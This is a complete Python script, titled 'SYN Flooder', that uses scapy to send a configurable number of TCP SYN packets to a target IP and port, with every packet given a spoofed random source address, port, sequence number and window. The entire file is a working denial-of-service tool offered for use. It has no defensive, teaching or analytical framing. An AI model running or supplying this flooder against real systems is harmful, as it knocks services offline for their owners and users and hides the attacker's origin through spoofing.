import argparse
import random
from scapy.all import send, IP, TCP

DEFAULT_PACKET_COUNT = 1000
MAX_PORT = 65535

def random_IP():
    IP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return IP

def get_args():
    parser = argparse.ArgumentParser(description="SYN Flooder")
    parser.add_argument('t', help = "Target IP address")
    parser.add_argument('-p', type = int, help = "Target port (default is 80)", default=80)
    parser.add_argument('-a', type = int, help = "Number of packets to send (default is 1000)", default=1000)
    args = parser.parse_args()
    return args.t, args.p, args.a

def SYN_flood(TARGET_IP, dPORT, packets_to_send):
    print("Sending packets...")
    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORT)
        sPORT = random.randint(0, MAX_PORT)
        Window = random.randint(0, MAX_PORT)
        src_IP = random_IP()
        packet = IP(dst=TARGET_IP, src=src_IP)/TCP(sport=sPORT, dport=dPORT, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
    print("Packets sent!")

def main():
    TARGET_IP, dPORT, packets_to_send = get_args()
    SYN_flood(TARGET_IP, dPORT, packets_to_send)
    
if __name__ == "__main__":
    main()